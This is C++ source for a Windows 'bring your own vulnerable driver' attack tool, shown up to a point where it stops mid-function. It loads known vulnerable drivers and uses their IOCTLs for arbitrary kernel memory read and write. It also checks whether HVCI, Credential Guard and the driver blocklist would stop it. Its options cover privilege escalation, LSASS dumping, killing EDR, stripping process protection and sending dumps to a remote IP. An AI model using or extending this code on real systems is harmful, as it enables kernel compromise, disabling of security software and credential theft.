/*
 * cascade.cpp - Consolidated BYOVD tool
 *
 * Providers supported (--driver-type):
 *   biostool  - BiosToolCommonDriver.sys (IOCTLs: 0x22202C/0x222030/0x222034)
 *   ktapi     - ktapi.sys  (IOCTLs: 0x82007000 map / 0x82007100 unmap)
 *   pdfwkrnl  - PdFwKrnl.sys already loaded (legacy warp.cpp backend)
 *
 * Requires: administrator, SeLoadDriverPrivilege.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

typedef unsigned long long QWORD;
typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

typedef struct _UNICODE_STRING_W {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} UNICODE_STRING_W, *PUNICODE_STRING_W;

typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING_W RegistryPath);
typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING_W RegistryPath);

static NtLoadDriver_t   g_NtLoadDriver   = nullptr;
static NtUnloadDriver_t g_NtUnloadDriver = nullptr;

// ---------------------------------------------------------------------------
// Provider types
// ---------------------------------------------------------------------------
enum class ProviderType { BiosTool, Ktapi, PdfwKrnl };

struct Config {
    ProviderType type         = ProviderType::BiosTool;
    std::string  drvPath;
    bool         dryRun       = false;
    bool         testRw       = false;
    bool         doPrivEsc    = false;
    bool         doDump       = false;
    bool         doDumpRpm    = false;
    bool         doDumpKernel = false;
    bool         doDumpTcp    = false;
    bool         doPatchCallbacks  = false;
    bool         doListCallbacks   = false;
    bool         doListProcs       = false;
    bool         doPplStrip   = false;
    bool         doPplAdd     = false;
    bool         killEdr      = false;
    bool         doKillPid    = false;
    bool         doDecode     = false;
    bool         noXor        = false;
    bool         verbose      = false;
    bool         doCheckSecurity   = false;
    bool         doCleanupOnly     = false;
    bool         forceUnsafe       = false;
    std::string  outPath;
    std::string  inPath;
    std::string  recvIp;
    int          recvPort     = 9999;
    DWORD        targetPid    = 0;
    BYTE         xorKey       = 0x55;
};

static bool g_verbose = false;

// ---------------------------------------------------------------------------
// EPROCESS offsets
// ---------------------------------------------------------------------------
struct KernelOffsets {
    ULONG64 UniqueProcessId    = 0;
    ULONG64 ActiveProcessLinks = 0;
    ULONG64 ImageFileName      = 0;
    ULONG64 Protection         = 0;
    ULONG64 Token              = 0;
};
static KernelOffsets g_off;

static void SetOffsetsByBuild(DWORD build) {
    g_off.UniqueProcessId    = 0x440;
    g_off.ActiveProcessLinks = 0x448;
    if (build >= 26100) {
        g_off.Token         = 0x248;
        g_off.Protection    = 0x5FA;
        g_off.ImageFileName = 0x338;
    } else if (build >= 22000) {
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
    } else if (build >= 19041) {
        g_off.Token         = 0x4B8;
        g_off.Protection    = 0x87A;
        g_off.ImageFileName = 0x5A8;
    } else if (build >= 18362) {
        g_off.Token         = 0x360;
        g_off.Protection    = 0x6FA;
        g_off.ImageFileName = 0x450;
    } else {
        g_off.Token         = 0x358;
        g_off.Protection    = 0x6CA;
        g_off.ImageFileName = 0x448;
    }
    if (g_verbose)
        printf("[*] Build %lu: UniqueProcessId=0x%llX APL=0x%llX FileName=0x%llX Protection=0x%llX Token=0x%llX\n",
            build, g_off.UniqueProcessId, g_off.ActiveProcessLinks,
            g_off.ImageFileName, g_off.Protection, g_off.Token);
}

static DWORD GetWindowsBuild() {
    HKEY hk;
    DWORD build = 0, sz = sizeof(build);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
            (LPBYTE)&build, &sz);
        if (!build) {
            char buf[16]{};
            sz = sizeof(buf);
            if (RegQueryValueExA(hk, "CurrentBuildNumber", nullptr, nullptr,
                (LPBYTE)buf, &sz) == ERROR_SUCCESS)
                build = (DWORD)atol(buf);
        }
        RegCloseKey(hk);
    }
    return build;
}

// ---------------------------------------------------------------------------
// Privilege helper
// ---------------------------------------------------------------------------
static bool EnablePrivilege(const char* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueA(nullptr, privName, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)
            && GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hToken);
    return ok;
}

// ---------------------------------------------------------------------------
// Security feature detection (VBS, HVCI, Credential Guard)
// ---------------------------------------------------------------------------
struct SecurityStatus {
    bool vbsEnabled          = false;
    bool hvciEnabled         = false;
    bool credGuardEnabled    = false;
    bool secureBootEnabled   = false;
    bool driverBlocklistOn   = false;
    std::string warnings;
};

static SecurityStatus CheckSecurityFeatures() {
    SecurityStatus s;
    
    // Method 1: Query DeviceGuard via WMI-style registry
    // HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity
    HKEY hk;
    DWORD val = 0, sz = sizeof(val);
    
    // VBS Running status
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "VirtualizationBasedSecurityStatus", nullptr, nullptr,
            (LPBYTE)&val, &sz) == ERROR_SUCCESS && val >= 2) {
            s.vbsEnabled = true;
        }
        RegCloseKey(hk);
    }
    
    // HVCI enabled
    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "Enabled", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.hvciEnabled = true;
        }
        RegCloseKey(hk);
    }
    
    // Credential Guard
    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "Enabled", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.credGuardEnabled = true;
        }
        RegCloseKey(hk);
    }
    
    // Alternative: check via Lsa registry (Credential Guard config)
    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "LsaCfgFlags", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.credGuardEnabled = true;
        }
        RegCloseKey(hk);
    }
    
    // Secure Boot status
    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "UEFISecureBootEnabled", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.secureBootEnabled = true;
        }
        RegCloseKey(hk);
    }
    
    // Driver blocklist (WDAC / HVCI driver blocklist)
    val = 0; sz = sizeof(val);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Config", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "VulnerableDriverBlocklistEnable", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val) {
            s.driverBlocklistOn = true;
        }
        RegCloseKey(hk);
    }
    
    // Build warning string
    if (s.hvciEnabled) {
        s.warnings += "[!] HVCI active - kernel writes may BSOD or fail silently\n";
    }
    if (s.credGuardEnabled) {
        s.warnings += "[!] Credential Guard active - LSASS secrets are VBS-isolated, dump will be empty\n";
    }
    if (s.driverBlocklistOn) {
        s.warnings += "[!] Driver blocklist enabled - known vulnerable drivers may fail to load\n";
    }
    if (s.vbsEnabled && !s.hvciEnabled && !s.credGuardEnabled) {
        s.warnings += "[*] VBS enabled but HVCI/CG not detected - kernel writes should work\n";
    }
    
    return s;
}

static void PrintSecurityStatus(const SecurityStatus& s) {
    printf("\n=== Windows Security Feature Status ===\n");
    printf("  VBS (Virtualization-Based Security): %s\n", s.vbsEnabled ? "ENABLED" : "disabled");
    printf("  HVCI (Hypervisor Code Integrity):    %s\n", s.hvciEnabled ? "ENABLED" : "disabled");
    printf("  Credential Guard:                    %s\n", s.credGuardEnabled ? "ENABLED" : "disabled");
    printf("  Secure Boot:                         %s\n", s.secureBootEnabled ? "ENABLED" : "disabled");
    printf("  Vulnerable Driver Blocklist:         %s\n", s.driverBlocklistOn ? "ENABLED" : "disabled");
    printf("\n");
    if (!s.warnings.empty()) {
        printf("%s\n", s.warnings.c_str());
    }
    if (!s.hvciEnabled && !s.credGuardEnabled) {
        printf("[+] System is compatible with BYOVD kernel operations\n\n");
    }
}

// ---------------------------------------------------------------------------
// Driver management

// ---------------------------------------------------------------------------
static std::wstring g_svcName;
static std::wstring g_regPath;
static std::wstring g_dropPath;

static std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    return w;
}

static std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, s.data(), n, nullptr, nullptr);
    return s;
}

static std::wstring SvcNameFromPath(const std::wstring& path) {
    auto pos = path.rfind(L'\\');
    std::wstring base = (pos == std::wstring::npos) ? path : path.substr(pos + 1);
    auto dot = base.rfind(L'.');
    if (dot != std::wstring::npos) base = base.substr(0, dot);
    return base;
}

static std::wstring RandomDropName() {
    static const wchar_t kChars[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    BYTE rnd[8]{};
    HCRYPTPROV prov = 0;
    if (CryptAcquireContextW(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(prov, sizeof(rnd), rnd);
    else
        for (int i = 0; i < 8; i++) rnd[i] = (BYTE)(GetTickCount() ^ GetCurrentProcessId() ^ i);
    if (prov) CryptReleaseContext(prov, 0);
    std::wstring name;
    for (int i = 0; i < 8; i++)
        name += kChars[rnd[i] % 36];
    return name;
}

static bool CopyDriverToTemp(const std::wstring& srcPath, std::wstring& outDest) {
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring name = RandomDropName() + L".sys";
    outDest = std::wstring(temp) + name;
    wchar_t srcFull[MAX_PATH]{}, dstFull[MAX_PATH]{};
    GetFullPathNameW(srcPath.c_str(), MAX_PATH, srcFull, nullptr);
    GetFullPathNameW(outDest.c_str(), MAX_PATH, dstFull, nullptr);
    if (_wcsicmp(srcFull, dstFull) == 0) return true;
    if (!CopyFileW(srcPath.c_str(), outDest.c_str(), FALSE)) {
        printf("[-] CopyFile failed (%lu)\n", GetLastError());
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// SHA-256 driver hash verification (opsec: catch wrong driver before load)
// ---------------------------------------------------------------------------
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

// Known-good driver SHA-256 hashes (lowercase hex). Extend as new drivers
// are validated. Empty allowlist means "warn only".
struct KnownDriver {
    const char* hashHex;
    const char* label;
    ProviderType type;
};
static const KnownDriver kKnownDrivers[] = {
    // BiosToolCommonDriver.sys - lab-validated build (fill in real hash)
    {"", "BiosToolCommonDriver (unknown build)", ProviderType::BiosTool},
    // PdFwKrnl.sys - Trend Micro; CVE-referenced
    {"", "PdFwKrnl (Trend Micro)", ProviderType::PdfwKrnl},
    // ktapi.sys - Insyde variant
    {"", "ktapi (Insyde)", ProviderType::Ktapi},
    {nullptr, nullptr, ProviderType::BiosTool}
};

static std::string Sha256File(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return {};
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string out;
    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT)) { CloseHandle(h); return {}; }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0); CloseHandle(h); return {};
    }
    BYTE buf[8192];
    DWORD n = 0;
    while (ReadFile(h, buf, sizeof(buf), &n, nullptr) && n > 0) {
        if (!CryptHashData(hHash, buf, n, 0)) break;
    }
    BYTE digest[32]; DWORD dlen = sizeof(digest);
    if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0)) {
        char hex[65] = {0};
        for (DWORD i = 0; i < dlen; i++) sprintf(hex + i*2, "%02x", digest[i]);
        out = hex;
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    CloseHandle(h);
    return out;
}

static bool VerifyDriverHash(const std::wstring& path, ProviderType expected,
                             bool force) {
    std::string hash = Sha256File(path);
    if (hash.empty()) {
        printf("[!] Could not hash driver file\n");
        return force;
    }
    printf("[*] Driver SHA-256: %s\n", hash.c_str());

    bool anyPopulated = false;
    for (const KnownDriver* d = kKnownDrivers; d->hashHex; d++) {
        if (d->hashHex[0]) anyPopulated = true;
        if (d->hashHex[0] && hash == d->hashHex) {
            if (d->type != expected) {
                printf("[!] Driver identified as '%s' but --driver-type is different\n", d->label);
                printf("    Continue? use --force-unsafe to override.\n");
                return force;
            }
            printf("[+] Driver recognized: %s\n", d->label);
            return true;
        }
    }
    if (!anyPopulated) {
        // Allowlist not yet populated; warn only
        printf("[*] Driver hash allowlist is empty; skipping validation\n");
        return true;
    }
    printf("[!] Driver hash NOT in known-good allowlist\n");
    printf("    This may be the wrong driver, wrong version, or tampered.\n");
    printf("    Continue with --force-unsafe if you trust this file.\n");
    return force;
}


static bool CreateDriverService(const std::wstring& svcName, const std::wstring& sysPath) {
    std::wstring ntPath  = L"\\??\\" + sysPath;
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    HKEY hk;
    LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, nullptr,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hk, nullptr);
    if (rc != ERROR_SUCCESS) { printf("[-] RegCreateKey failed (%ld)\n", rc); return false; }
    DWORD type = 1, start = 3, err = 1;
    RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
    RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
    RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
        (BYTE*)ntPath.c_str(), (DWORD)((ntPath.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    return true;
}

static bool LoadDriverViaNt(const std::wstring& regPath) {
    UNICODE_STRING_W us{};
    us.Buffer        = (LPWSTR)regPath.c_str();
    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtLoadDriver(&us);
    if (!NT_SUCCESS(st)
        && st != (LONG)0xC000010E   /* STATUS_IMAGE_ALREADY_LOADED */
        && st != (LONG)0xC0000035   /* STATUS_OBJECT_NAME_COLLISION: device already registered */
    ) {
        printf("[-] NtLoadDriver failed: 0x%08lX\n", st);
        return false;
    }
    printf("[+] NtLoadDriver: 0x%08lX\n", st);
    return true;
}

static bool UnloadDriverViaNt(const std::wstring& regPath) {
    if (!g_NtUnloadDriver) return false;
    UNICODE_STRING_W us{};
    us.Buffer        = (LPWSTR)regPath.c_str();
    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS st = g_NtUnloadDriver(&us);
    printf("[*] NtUnloadDriver: 0x%08lX\n", st);
    return NT_SUCCESS(st);
}

static void DeleteServiceKey(const std::wstring& svcName) {
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
}

// ---------------------------------------------------------------------------
// Kernel R/W - BiosToolCommonDriver backend
// ---------------------------------------------------------------------------
static HANDLE g_biostoolDev = INVALID_HANDLE_VALUE;

#define BIOSTOOL_READ_PHYS  0x22202Cu
#define BIOSTOOL_WRITE_PHYS 0x222030u
#define BIOSTOOL_VA2PA      0x222034u

static PVOID BiosTool_Va2Pa(PVOID va) {
    struct { PVOID VA; PVOID PA; } req{va, nullptr};
    DWORD ret = 0;
    if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_VA2PA,
        &req, sizeof(req), &req, sizeof(req), &ret, nullptr))
        return nullptr;
    return req.PA;
}

static bool BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { PVOID PA; ULONG Size; ULONG Pad; } req{pCurPA, chunk, 0};
        BYTE tmp[0x1008]{};
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_READ_PHYS,
            &req, sizeof(req), tmp, sizeof(tmp), &got, nullptr))
            return false;
        memcpy(pCurBuf, tmp + 8, chunk);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR pageOff = (ULONG_PTR)pCurPA & 0xFFF;
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)(0x1000 - pageOff));
        struct { ULONG Size; ULONG Pad; PUCHAR Data; PVOID PA; }
            req{ chunk, 0, pCurData, pCurPA };
        DWORD got = 0;
        if (!DeviceIoControl(g_biostoolDev, BIOSTOOL_WRITE_PHYS,
            &req, sizeof(req), &req, sizeof(req), &got, nullptr))
            return false;
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static bool BiosTool_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool BiosTool_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = BiosTool_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!BiosTool_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - Ktapi backend
// Device: \\.\ktapi   IOCTLs: 0x82007000 (map PA->VA)  0x82007100 (unmap)
// VA->PA: CR3 page walk bootstrapped from physical scan of PML4 self-ref.
// ---------------------------------------------------------------------------
static HANDLE g_ktapiDev = INVALID_HANDLE_VALUE;
static QWORD  g_ktapiCr3 = 0;  // kernel CR3 found by PML4 scan

#define KTAPI_IOCTL_MAP   0x82007000u
#define KTAPI_IOCTL_UNMAP 0x82007100u

static PVOID Ktapi_MapPhys(PVOID pa, SIZE_T size) {
    struct { ULONG InterfaceType; ULONG BusNumber; PVOID PhysAddr; ULONG AddrSpace; ULONG Length; }
        req{ 0, 0, pa, 0, (ULONG)size };
    PVOID mapped = nullptr;
    DWORD got = 0;
    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_MAP, &req, sizeof(req),
                    &mapped, sizeof(mapped), &got, nullptr);
    return mapped;
}

static void Ktapi_UnmapPhys(PVOID mapped) {
    if (!mapped) return;
    DWORD got = 0;
    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_UNMAP, &mapped, sizeof(mapped),
                    nullptr, 0, &got, nullptr);
}

// Scan first 4GB of physical RAM for a page that self-maps at PML4[0x1ED].
// A self-referencing PML4 entry satisfies: (entry & ~0xFFF) == PA_of_this_page.
static QWORD Ktapi_FindCr3() {
    for (QWORD pa = 0; pa < 0x100000000ULL; pa += 0x1000) {
        PVOID m = Ktapi_MapPhys((PVOID)pa, 0x1000);
        if (!m) continue;
        QWORD entry = *(QWORD*)((PUCHAR)m + 0x1ED * 8);
        Ktapi_UnmapPhys(m);
        if ((entry & 1) && (entry & ~0xFFFULL) == pa)
            return pa;
    }
    return 0;
}

static QWORD Ktapi_PhysReadQword(QWORD pa) {
    QWORD v = 0;
    PVOID m = Ktapi_MapPhys((PVOID)pa, 8);
    if (m) { v = *(QWORD*)m; Ktapi_UnmapPhys(m); }
    return v;
}

static bool Ktapi_PhysRead(PVOID pa, SIZE_T size, PVOID buf) {
    auto pCurPA  = (PUCHAR)pa;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
        if (!m) return false;
        memcpy(pCurBuf, (PUCHAR)m + off, chunk);
        Ktapi_UnmapPhys(m);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Ktapi_PhysWrite(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
        if (!m) return false;
        memcpy((PUCHAR)m + off, pCurData, chunk);
        Ktapi_UnmapPhys(m);
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static QWORD Ktapi_Va2Pa(QWORD va) {
    if (!g_ktapiCr3) return 0;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = Ktapi_PhysReadQword((g_ktapiCr3 & ~0xFFFULL) + pml4_idx * 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = Ktapi_PhysReadQword((pml4e & ~0xFFFULL) + pdpt_idx * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = Ktapi_PhysReadQword((pdpte & ~0xFFFULL) + pd_idx * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
    QWORD pte = Ktapi_PhysReadQword((pde & ~0xFFFULL) + pt_idx * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | offset;
}

static bool Ktapi_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T chunk = std::min(size, (SIZE_T)0x1000);
        QWORD pa = Ktapi_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Ktapi_PhysRead((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Ktapi_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T chunk = std::min(size, (SIZE_T)0x1000);
        QWORD pa = Ktapi_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Ktapi_PhysWrite((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - PdFwKrnl backend
// ---------------------------------------------------------------------------
static HANDLE g_pdfwDev = INVALID_HANDLE_VALUE;
#define IOCTL_AMDPDFW_MEMCPY 0x80002014

typedef struct { BYTE r[16]; PVOID Dst; PVOID Src; PVOID r2; DWORD Size; DWORD r3; } PDFW_REQ;

static bool PdfwKrnl_KRead(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = buf; r.Src = (PVOID)addr; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

static bool PdfwKrnl_KWrite(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = (PVOID)addr; r.Src = buf; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

// ---------------------------------------------------------------------------
// Unified R/W dispatch
// ---------------------------------------------------------------------------
static ProviderType g_activeProvider;

static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool: return BiosTool_KRead(addr, buf, size);
    case ProviderType::Ktapi:    return Ktapi_KRead(addr, buf, size);
    case ProviderType::PdfwKrnl: return PdfwKrnl_KRead(addr, buf, (DWORD)size);
    default: return false;
    }
}

static bool KWrite(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool: return BiosTool_KWrite(addr, buf, size);
    case ProviderType::Ktapi:    return Ktapi_KWrite(addr, buf, size);
    case ProviderType::PdfwKrnl: return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
    default: return false;
    }
}

static QWORD KReadQword(QWORD addr) {
    QWORD v = 0;
    KRead(addr, &v, 8);
    return v;
}

// ---------------------------------------------------------------------------
// Offset scanning
// ---------------------------------------------------------------------------
static bool LooksLikeName(QWORD eproc, QWORD off) {
    BYTE b[16]{};
    if (!KRead(eproc + off, b, 16)) return false;
    int ok = 0;
    for (int i = 0; i < 15; i++) {
        if (!b[i]) break;
        if (b[i] >= 0x20 && b[i] < 0x7f) ok++;
    }
    return ok >= 3;
}

static bool LooksLikeProtection(QWORD eproc, QWORD off) {
    BYTE b = 0xFF;
    if (!KRead(eproc + off, &b, 1)) return false;
    // Valid PS_PROTECTION: Type (bits 0-1) in {0,1,2}, bits 2-3 must be 0,
    // Signer (bits 4-7) in {0..7}. Covers all real values 0x00..0x72.
    return b <= 0x72 && (b & 0x0C) == 0 && (b & 0x03) <= 2;
}

static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
    (void)pid;
    if (!LooksLikeName(eproc, g_off.ImageFileName)) {
        for (QWORD s = 0x300; s <= 0x700; s += 8) {
            if (LooksLikeName(eproc, s)) {
                printf("[*] ImageFileName scanned to 0x%llX (was 0x%llX)\n", s, g_off.ImageFileName);
                g_off.ImageFileName = s;
                break;
            }
        }
    }
    if (!LooksLikeProtection(eproc, g_off.Protection)) {
        for (QWORD s = 0x500; s <= 0xA00; s += 8) {
            if (LooksLikeProtection(eproc, s)) {
